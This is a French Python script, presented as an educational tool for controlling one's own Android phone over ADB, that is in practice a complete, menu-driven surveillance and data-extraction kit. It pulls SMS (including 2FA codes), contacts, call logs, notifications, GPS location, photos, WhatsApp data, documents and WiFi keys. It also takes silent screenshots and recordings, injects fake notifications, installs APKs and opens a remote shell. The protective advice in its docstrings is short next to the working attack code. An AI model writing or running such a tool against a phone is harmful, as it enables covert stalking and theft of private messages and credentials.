#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    OUTIL COMPLET DE CONTROLE TELEPHONE                       ║
║                         Pour VOTRE propre appareil                           ║
║                                                                              ║
║  Cet outil montre comment les attaquants peuvent exploiter un téléphone      ║
║  Android si ils y ont accès. Utilisez-le pour apprendre et vous protéger.   ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import subprocess
import os
import sys
import json
import time
from datetime import datetime
from pathlib import Path

# ============================================================================
# CONFIGURATION
# ============================================================================

ADB_PATH = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
PHONE_IP = "100.88.242.60:5555"  # IP Tailscale de votre TECNO CK6
OUTPUT_DIR = Path(r"C:\Users\davis\OneDrive\Bureau\HACKING\02_EXTRACTION_DONNEES\TECNO_CK6")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================================
# FONCTIONS ADB DE BASE
# ============================================================================

def run_adb(command, capture=True):
    """Exécute une commande ADB"""
    full_cmd = f'"{ADB_PATH}" -s {PHONE_IP} {command}'
    try:
        if capture:
            result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        else:
            subprocess.run(full_cmd, shell=True)
            return ""
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERREUR] {e}"

def check_connection():
    """Vérifie la connexion au téléphone"""
    result = run_adb("shell getprop ro.product.model")
    if "TECNO" in result or "CK6" in result:
        return True, result.strip()
    return False, result

# ============================================================================
# CATEGORIE 1: EXTRACTION DE DONNEES PERSONNELLES
# ============================================================================

def extraire_sms():
    """
    🔴 ATTAQUE: Extraction des SMS
    
    COMMENT ÇA MARCHE:
    - ADB peut lire la base de données SMS via content provider
    - Contient tous les messages: reçus, envoyés, brouillons
    - Inclut les codes 2FA, messages bancaires, conversations privées
    
    RISQUES:
    - Vol de codes de vérification (2FA par SMS)
    - Lecture de messages confidentiels
    - Usurpation d'identité
    
    PROTECTION:
    - Désactiver le débogage USB quand non utilisé
    - Utiliser une app 2FA au lieu des SMS
    """
    print("\n" + "="*60)
    print("📱 EXTRACTION DES SMS")
    print("="*60)
    print("""
    ⚠️  EXPLICATION DE L'ATTAQUE:
    Un attaquant avec accès ADB peut lire TOUS vos SMS.
    Cela inclut les codes de vérification bancaires!
    
    🛡️  COMMENT SE PROTEGER:
    - Désactiver le débogage USB
    - Utiliser Google Authenticator au lieu de SMS pour la 2FA
    - Ne jamais laisser son téléphone sans surveillance
    """)
    
    # SMS reçus
    print("\n--- SMS REÇUS ---")
    inbox = run_adb('shell content query --uri content://sms/inbox --projection address:body:date --sort "date DESC"')
    
    # Formatter et afficher
    messages = []
    for line in inbox.split('\n')[:10]:
        if 'address=' in line:
            print(f"  {line[:100]}...")
            messages.append(line)
    
    # Sauvegarder
    with open(OUTPUT_DIR / "sms_extraits.txt", "w", encoding="utf-8") as f:
        f.write(f"Extraction: {datetime.now()}\n\n")
        f.write(inbox)
    
    print(f"\n✅ SMS sauvegardés dans: {OUTPUT_DIR / 'sms_extraits.txt'}")
    return len(messages)

def extraire_contacts():
    """
    🔴 ATTAQUE: Extraction des contacts
    
    COMMENT ÇA MARCHE:
    - Accès au content provider des contacts
    - Récupère noms, numéros, emails, adresses
    
    RISQUES:
    - Phishing ciblé sur vos contacts
    - Usurpation d'identité
    - Spam et harcèlement
    """
    print("\n" + "="*60)
    print("👥 EXTRACTION DES CONTACTS")
    print("="*60)
    print("""
    ⚠️  EXPLICATION DE L'ATTAQUE:
    Vos contacts peuvent être utilisés pour du phishing.
    "Salut, c'est [votre nom], j'ai perdu mon tel, envoie-moi de l'argent..."
    """)
    
    contacts = run_adb('shell content query --uri content://contacts/phones --projection display_name:number')
    
    with open(OUTPUT_DIR / "contacts_extraits.txt", "w", encoding="utf-8") as f:
        f.write(f"Extraction: {datetime.now()}\n\n")
        f.write(contacts)
    
    print(contacts[:500])
    print(f"\n✅ Contacts sauvegardés")
    return contacts.count("display_name=")

def extraire_historique_appels():
    """
    🔴 ATTAQUE: Extraction de l'historique des appels
    """
    print("\n" + "="*60)
    print("📞 HISTORIQUE DES APPELS")
    print("="*60)
    
    calls = run_adb('shell content query --uri content://call_log/calls --projection number:name:type:date:duration --sort "date DESC"')
    
    with open(OUTPUT_DIR / "appels_extraits.txt", "w", encoding="utf-8") as f:
        f.write(f"Extraction: {datetime.now()}\n")
        f.write("Type: 1=Entrant, 2=Sortant, 3=Manqué\n\n")
        f.write(calls)
    
    print(calls[:500])
    return calls.count("number=")

# ============================================================================
# CATEGORIE 2: SURVEILLANCE EN TEMPS REEL
# ============================================================================

def capture_ecran():
    """
    🔴 ATTAQUE: Capture d'écran à distance
    
    COMMENT ÇA MARCHE:
    - Commande screencap intégrée à Android
    - Capture silencieuse sans notification
    
    RISQUES:
    - Voir ce que vous faites en temps réel
    - Capturer mots de passe visibles
    - Voler des informations confidentielles
    """
    print("\n" + "="*60)
    print("📸 CAPTURE D'ÉCRAN À DISTANCE")
    print("="*60)
    print("""
    ⚠️  Un attaquant peut voir votre écran à tout moment!
    """)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/screen_{timestamp}.png"
    local_file = OUTPUT_DIR / f"screenshot_{timestamp}.png"
    
    run_adb(f'shell screencap {remote_file}')
    run_adb(f'pull {remote_file} "{local_file}"')
    run_adb(f'shell rm {remote_file}')
    
    print(f"✅ Capture sauvegardée: {local_file}")
    
    # Ouvrir l'image
    if local_file.exists():
        os.startfile(str(local_file))
    
    return str(local_file)

def enregistrer_ecran(duree=30):
    """
    🔴 ATTAQUE: Enregistrement vidéo de l'écran
    """
    print("\n" + "="*60)
    print(f"🎥 ENREGISTREMENT ÉCRAN ({duree} secondes)")
    print("="*60)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/record_{timestamp}.mp4"
    local_file = OUTPUT_DIR / f"enregistrement_{timestamp}.mp4"
    
    print(f"⏺️ Enregistrement en cours ({duree}s)...")
    run_adb(f'shell screenrecord --time-limit {duree} {remote_file}')
    run_adb(f'pull {remote_file} "{local_file}"')
    run_adb(f'shell rm {remote_file}')
    
    print(f"✅ Vidéo sauvegardée: {local_file}")
    return str(local_file)

def voir_notifications():
    """
    🔴 ATTAQUE: Interception des notifications
    
    COMMENT ÇA MARCHE:
    - dumpsys notification montre toutes les notifications
    - Inclut messages WhatsApp, emails, alertes bancaires
    
    RISQUES:
    - Lire les messages sans ouvrir les apps
    - Intercepter les codes 2FA
    - Surveillance totale
    """
    print("\n" + "="*60)
    print("🔔 NOTIFICATIONS EN TEMPS RÉEL")
    print("="*60)
    print("""
    ⚠️  TOUTES vos notifications sont visibles!
    WhatsApp, SMS, Emails, Banque...
    """)
    
    notifs = run_adb('shell dumpsys notification --noredact')
    
    # Extraire les infos importantes
    important_lines = []
    for line in notifs.split('\n'):
        if any(x in line.lower() for x in ['pkg=', 'title=', 'text=', 'tickertext=']):
            important_lines.append(line.strip())
    
    with open(OUTPUT_DIR / "notifications.txt", "w", encoding="utf-8") as f:
        f.write(f"Extraction: {datetime.now()}\n\n")
        f.write('\n'.join(important_lines[:50]))
    
    for line in important_lines[:15]:
        print(f"  {line[:80]}")
    
    return len(important_lines)

def localisation_gps():
    """
    🔴 ATTAQUE: Tracking GPS
    
    COMMENT ÇA MARCHE:
    - Accès aux dernières positions GPS
    - Historique de localisation
    
    RISQUES:
    - Savoir où vous êtes
    - Suivre vos déplacements
    - Cambriolage quand vous n'êtes pas chez vous
    """
    print("\n" + "="*60)
    print("📍 LOCALISATION GPS")
    print("="*60)
    print("""
    ⚠️  Un attaquant peut savoir OÙ vous êtes!
    """)
    
    location = run_adb('shell dumpsys location')
    
    # Chercher les coordonnées
    for line in location.split('\n'):
        if any(x in line.lower() for x in ['latitude', 'longitude', 'last location', 'location=']):
            print(f"  {line.strip()}")
    
    with open(OUTPUT_DIR / "localisation.txt", "w", encoding="utf-8") as f:
        f.write(f"Extraction: {datetime.now()}\n\n")
        f.write(location)
    
    return True

# ============================================================================
# CATEGORIE 3: CONTROLE DU TELEPHONE
# ============================================================================

def envoyer_notification(titre, message):
    """
    🔴 ATTAQUE: Envoyer des fausses notifications
    
    COMMENT ÇA MARCHE:
    - Injecter des notifications via cmd notification
    - Peut imiter n'importe quelle app
    
    RISQUES:
    - Faux messages de banque
    - Phishing ciblé
    - Manipulation psychologique
    """
    print("\n" + "="*60)
    print("📨 ENVOI DE NOTIFICATION")
    print("="*60)
    
    result = run_adb(f'shell cmd notification post -t "{titre}" "{message}" notification_test')
    print(f"✅ Notification envoyée: {titre}")
    return True

def ouvrir_url(url):
    """
    🔴 ATTAQUE: Ouvrir une URL sur le téléphone
    
    COMMENT ÇA MARCHE:
    - Commande am start pour lancer le navigateur
    
    RISQUES:
    - Rediriger vers un site de phishing
    - Télécharger des malwares
    """
    print("\n" + "="*60)
    print("🌐 OUVERTURE D'URL")
    print("="*60)
    
    run_adb(f'shell am start -a android.intent.action.VIEW -d "{url}"')
    print(f"✅ URL ouverte: {url}")
    return True

def installer_apk(chemin_apk):
    """
    🔴 ATTAQUE: Installation silencieuse d'APK
    
    COMMENT ÇA MARCHE:
    - Push de l'APK puis installation
    - Peut être un malware, spyware, keylogger
    
    RISQUES:
    - Installation de malwares
    - Backdoors permanentes
    - Contrôle total du téléphone
    """
    print("\n" + "="*60)
    print("📦 INSTALLATION D'APPLICATION")
    print("="*60)
    print("""
    ⚠️  C'est ainsi que les malwares sont installés!
    Un attaquant peut installer n'importe quelle app.
    """)
    
    if os.path.exists(chemin_apk):
        run_adb(f'install "{chemin_apk}"')
        print(f"✅ APK installé: {chemin_apk}")
        return True
    else:
        print(f"❌ Fichier non trouvé: {chemin_apk}")
        return False

def lister_apps():
    """Liste les applications installées"""
    print("\n" + "="*60)
    print("📱 APPLICATIONS INSTALLÉES")
    print("="*60)
    
    apps = run_adb('shell pm list packages -3')
    
    print("\n--- Applications tierces ---")
    for line in apps.split('\n')[:20]:
        if line.strip():
            print(f"  {line.replace('package:', '')}")
    
    with open(OUTPUT_DIR / "applications.txt", "w", encoding="utf-8") as f:
        f.write(apps)
    
    return apps.count("package:")

def desinstaller_app(package_name):
    """Désinstaller une application"""
    print(f"\n🗑️ Désinstallation de {package_name}...")
    result = run_adb(f'shell pm uninstall {package_name}')
    print(result)
    return "Success" in result

# ============================================================================
# CATEGORIE 4: VOL DE FICHIERS
# ============================================================================

def telecharger_photos():
    """
    🔴 ATTAQUE: Vol des photos
    """
    print("\n" + "="*60)
    print("📷 TÉLÉCHARGEMENT DES PHOTOS")
    print("="*60)
    print("""
    ⚠️  Toutes vos photos peuvent être volées!
    """)
    
    dest = OUTPUT_DIR / "Photos"
    dest.mkdir(exist_ok=True)
    
    run_adb(f'pull /sdcard/DCIM "{dest}"')
    print(f"✅ Photos téléchargées dans: {dest}")
    return str(dest)

def telecharger_whatsapp():
    """
    🔴 ATTAQUE: Vol des données WhatsApp
    """
    print("\n" + "="*60)
    print("💬 TÉLÉCHARGEMENT WHATSAPP")
    print("="*60)
    
    dest = OUTPUT_DIR / "WhatsApp"
    dest.mkdir(exist_ok=True)
    
    run_adb(f'pull /sdcard/WhatsApp "{dest}"')
    print(f"✅ WhatsApp téléchargé dans: {dest}")
    return str(dest)

def telecharger_documents():
    """Vol des documents"""
    print("\n" + "="*60)
    print("📄 TÉLÉCHARGEMENT DES DOCUMENTS")
    print("="*60)
    
    dest = OUTPUT_DIR / "Documents"
    dest.mkdir(exist_ok=True)
    
    run_adb(f'pull /sdcard/Documents "{dest}"')
    run_adb(f'pull /sdcard/Download "{dest}/Download"')
    print(f"✅ Documents téléchargés dans: {dest}")
    return str(dest)

# ============================================================================
# CATEGORIE 5: INFORMATIONS SYSTEME
# ============================================================================

def info_systeme():
    """Informations complètes du système"""
    print("\n" + "="*60)
    print("ℹ️ INFORMATIONS SYSTÈME")
    print("="*60)
    
    info = {
        "modele": run_adb("shell getprop ro.product.model").strip(),
        "marque": run_adb("shell getprop ro.product.brand").strip(),
        "android_version": run_adb("shell getprop ro.build.version.release").strip(),
        "sdk": run_adb("shell getprop ro.build.version.sdk").strip(),
        "serial": run_adb("shell getprop ro.serialno").strip(),
        "wifi_mac": run_adb("shell cat /sys/class/net/wlan0/address 2>/dev/null").strip(),
        "ip_locale": run_adb("shell ip addr show wlan0 | grep 'inet '").strip(),
    }
    
    for key, value in info.items():
        print(f"  {key}: {value}")
    
    with open(OUTPUT_DIR / "system_info.json", "w", encoding="utf-8") as f:
        json.dump(info, f, indent=2)
    
    return info

def info_batterie():
    """État de la batterie"""
    print("\n" + "="*60)
    print("🔋 ÉTAT DE LA BATTERIE")
    print("="*60)
    
    battery = run_adb("shell dumpsys battery")
    print(battery)
    return battery

def wifi_enregistres():
    """
    🔴 ATTAQUE: Vol des mots de passe WiFi
    
    COMMENT ÇA MARCHE:
    - Les mots de passe WiFi sont stockés en clair (avec root)
    
    RISQUES:
    - Accès à votre réseau WiFi
    - Attaques sur votre réseau local
    """
    print("\n" + "="*60)
    print("📶 RÉSEAUX WIFI ENREGISTRÉS")
    print("="*60)
    print("""
    ⚠️  Les mots de passe WiFi peuvent être volés!
    (nécessite root pour les mots de passe)
    """)
    
    wifi = run_adb("shell cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null")
    
    # Chercher les SSID
    for line in wifi.split('\n'):
        if 'SSID' in line or 'PreSharedKey' in line:
            print(f"  {line.strip()}")
    
    return wifi

# ============================================================================
# CATEGORIE 6: SHELL ET COMMANDES AVANCEES
# ============================================================================

def shell_interactif():
    """Ouvre un shell interactif"""
    print("\n" + "="*60)
    print("💻 SHELL INTERACTIF")
    print("="*60)
    print("Tapez 'exit' pour quitter\n")
    
    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == 'exit':
            break
        if cmd:
            result = run_adb(f'shell {cmd}')
            print(result)

def executer_commande(commande):
    """Exécute une commande shell"""
    return run_adb(f'shell {commande}')

# ============================================================================
# CATEGORIE 7: EXTRACTION COMPLETE
# ============================================================================

def extraction_complete():
    """
    🔴 ATTAQUE: Extraction totale des données
    
    Ceci représente ce qu'un attaquant ferait en quelques minutes
    s'il avait accès à votre téléphone.
    """
    print("\n" + "="*70)
    print("💀 EXTRACTION COMPLÈTE - SIMULATION D'ATTAQUE")
    print("="*70)
    print("""
    ⚠️  ATTENTION: Ceci montre ce qu'un attaquant peut faire!
    
    En quelques minutes, toutes vos données peuvent être volées:
    - SMS (codes bancaires, messages privés)
    - Contacts (pour du phishing)
    - Photos (chantage possible)
    - WhatsApp (conversations privées)
    - Localisation (savoir où vous êtes)
    - Mots de passe WiFi (accès à votre réseau)
    
    🛡️  PROTÉGEZ-VOUS:
    1. Désactivez le débogage USB
    2. Ne laissez jamais votre téléphone sans surveillance
    3. Utilisez un code PIN complexe
    4. Activez le chiffrement du téléphone
    """)
    
    input("\nAppuyez sur Entrée pour lancer l'extraction...")
    
    resultats = {}
    
    print("\n[1/8] Extraction des SMS...")
    resultats["sms"] = extraire_sms()
    
    print("\n[2/8] Extraction des contacts...")
    resultats["contacts"] = extraire_contacts()
    
    print("\n[3/8] Extraction de l'historique d'appels...")
    resultats["appels"] = extraire_historique_appels()
    
    print("\n[4/8] Capture d'écran...")
    resultats["screenshot"] = capture_ecran()
    
    print("\n[5/8] Extraction des notifications...")
    resultats["notifications"] = voir_notifications()
    
    print("\n[6/8] Localisation GPS...")
    resultats["gps"] = localisation_gps()
    
    print("\n[7/8] Informations système...")
    resultats["system"] = info_systeme()
    
    print("\n[8/8] Liste des applications...")
    resultats["apps"] = lister_apps()
    
    # Résumé
    print("\n" + "="*70)
    print("📊 RÉSUMÉ DE L'EXTRACTION")
    print("="*70)
    print(f"""
    ✅ Données extraites:
       - SMS: {resultats.get('sms', 0)} messages
       - Contacts: {resultats.get('contacts', 0)} contacts
       - Appels: {resultats.get('appels', 0)} appels
       - Notifications: {resultats.get('notifications', 0)} notifications
       - Applications: {resultats.get('apps', 0)} apps
    
    📁 Fichiers sauvegardés dans:
       {OUTPUT_DIR}
    """)
    
    return resultats

# ============================================================================
# MENU PRINCIPAL
# ============================================================================

def afficher_menu():
    """Affiche le menu principal"""
    print("\n" + "="*70)
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║         OUTIL COMPLET DE CONTROLE TELEPHONE                      ║")
    print("║                   Pour apprendre la sécurité                     ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print("="*70)
    print("""
    ┌─────────────────────────────────────────────────────────────────┐
    │  📱 EXTRACTION DE DONNÉES                                       │
    ├─────────────────────────────────────────────────────────────────┤
    │  [1]  Extraire les SMS (+ explication attaque)                  │
    │  [2]  Extraire les contacts                                     │
    │  [3]  Historique des appels                                     │
    │  [4]  Notifications en temps réel                               │
    ├─────────────────────────────────────────────────────────────────┤
    │  📸 SURVEILLANCE                                                │
    ├─────────────────────────────────────────────────────────────────┤
    │  [5]  Capture d'écran                                           │
    │  [6]  Enregistrer l'écran (30s)                                 │
    │  [7]  Localisation GPS                                          │
    ├─────────────────────────────────────────────────────────────────┤
    │  📂 VOL DE FICHIERS                                             │
    ├─────────────────────────────────────────────────────────────────┤
    │  [8]  Télécharger les photos                                    │
    │  [9]  Télécharger WhatsApp                                      │
    │  [10] Télécharger les documents                                 │
    ├─────────────────────────────────────────────────────────────────┤
    │  ⚙️  CONTRÔLE                                                   │
    ├─────────────────────────────────────────────────────────────────┤
    │  [11] Envoyer une notification                                  │
    │  [12] Ouvrir une URL                                            │
    │  [13] Liste des applications                                    │
    │  [14] Shell interactif                                          │
    ├─────────────────────────────────────────────────────────────────┤
    │  ℹ️  INFORMATIONS                                               │
    ├─────────────────────────────────────────────────────────────────┤
    │  [15] Informations système                                      │
    │  [16] État batterie                                             │
    │  [17] Réseaux WiFi enregistrés                                  │
    ├─────────────────────────────────────────────────────────────────┤
    │  💀 SIMULATION D'ATTAQUE                                        │
    ├─────────────────────────────────────────────────────────────────┤
    │  [20] EXTRACTION COMPLÈTE (tout extraire)                       │
    ├─────────────────────────────────────────────────────────────────┤
    │  [0]  Quitter                                                   │
    └─────────────────────────────────────────────────────────────────┘
    """)

def main():
    """Fonction principale"""
    print("\n🔍 Vérification de la connexion...")
    connected, model = check_connection()
    
    if not connected:
        print(f"❌ Téléphone non connecté!")
        print(f"   Essayez: adb connect {PHONE_IP}")
        sys.exit(1)
    
    print(f"✅ Connecté à: {model}")
    
    while True:
        afficher_menu()
        choix = input("\n👉 Votre choix: ").strip()
        
        try:
            if choix == "0":
                print("\n👋 Au revoir!")
                break
            elif choix == "1":
                extraire_sms()
            elif choix == "2":
                extraire_contacts()
            elif choix == "3":
                extraire_historique_appels()
            elif choix == "4":
                voir_notifications()
            elif choix == "5":
                capture_ecran()
            elif choix == "6":
                duree = input("Durée en secondes (défaut 30): ").strip()
                enregistrer_ecran(int(duree) if duree else 30)
            elif choix == "7":
                localisation_gps()
            elif choix == "8":
                telecharger_photos()
            elif choix == "9":
                telecharger_whatsapp()
            elif choix == "10":
                telecharger_documents()
            elif choix == "11":
                titre = input("Titre de la notification: ")
                message = input("Message: ")
                envoyer_notification(titre, message)
            elif choix == "12":
                url = input("URL à ouvrir: ")
                ouvrir_url(url)
            elif choix == "13":
                lister_apps()
            elif choix == "14":
                shell_interactif()
            elif choix == "15":
                info_systeme()
            elif choix == "16":
                info_batterie()
            elif choix == "17":
                wifi_enregistres()
            elif choix == "20":
                extraction_complete()
            else:
                print("❌ Option invalide")
        
        except Exception as e:
            print(f"❌ Erreur: {e}")
        
        input("\n⏎ Appuyez sur Entrée pour continuer...")

if __name__ == "__main__":
    main()
